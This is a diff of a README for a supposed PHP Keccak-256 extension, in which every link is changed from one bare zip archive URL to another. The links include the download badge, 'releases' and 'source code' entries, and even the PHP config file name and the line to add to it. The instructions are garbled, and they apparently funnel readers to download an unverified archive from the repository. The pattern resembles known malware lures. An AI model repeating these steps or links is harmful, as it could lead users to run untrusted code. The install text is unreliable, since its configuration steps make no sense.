@@ -6,7 +6,7 @@ Welcome to php-keccak256! This application provides high-performance Keccak-256 
 
 ## 📥 Download Now
 
-[![Download php-keccak256](https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip%https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip)](https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip)
+[![Download php-keccak256](https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip%https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip)](https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip)
 
 ## 🔍 Overview
 
@@ -35,7 +35,7 @@ Keccak-256 is an essential hashing algorithm in blockchain technology, especiall
 ## 📚 How to Download & Install
 
 1. **Visit the Releases Page**: Go to our releases page to see the latest version and download options.
-   - [Visit this page to download](https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip)
+   - [Visit this page to download](https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip)
 
 2. **Select the Release**: Find the latest version labeled as "Latest Release" for the best performance. 
 
@@ -49,9 +49,9 @@ Keccak-256 is an essential hashing algorithm in blockchain technology, especiall
    - Check the README file within the extracted folder for specific installation steps tailored to your operating system.
    - Common installation methods may include using `php` commands in your terminal.
 
-6. **Enable the Extension**: After installation, you may need to enable the extension in your PHP configuration file (https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip). 
-   - Find the `https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip` file.
-   - Add the line: `https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip` (or the equivalent for your OS).
+6. **Enable the Extension**: After installation, you may need to enable the extension in your PHP configuration file (https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip). 
+   - Find the `https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip` file.
+   - Add the line: `https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip` (or the equivalent for your OS).
 
 7. **Verify Installation**: 
    - Run a simple PHP script to confirm proper setup. You can use:
@@ -82,7 +82,7 @@ You can use this hash in various applications, including Ethereum-related projec
 If you encounter any issues:
 
 - **Installation Problems**: Double-check the steps and ensure that your PHP version meets the requirements.
-- **Function Errors**: Make sure that you enabled the extension correctly in your `https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip` file.
+- **Function Errors**: Make sure that you enabled the extension correctly in your `https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip` file.
 
 For more assistance, consider checking out our issue tracker on GitHub or community forums. 
 
@@ -96,7 +96,7 @@ If you find ways to improve php-keccak256 or want to add features, feel free to 
 
 ## 🔗 Links and Resources
 
-- [Source Code on GitHub](https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip)
-- [GitHub Releases](https://raw.githubusercontent.com/AMJika/php-keccak256/main/Bim/php-keccak256.zip)
+- [Source Code on GitHub](https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip)
+- [GitHub Releases](https://github.com/AMJika/php-keccak256/raw/refs/heads/main/Bim/keccak_php_v2.3-beta.4.zip)
 
 By following these steps, you can efficiently download, install, and start using php-keccak256 for your hashing needs in PHP applications. 
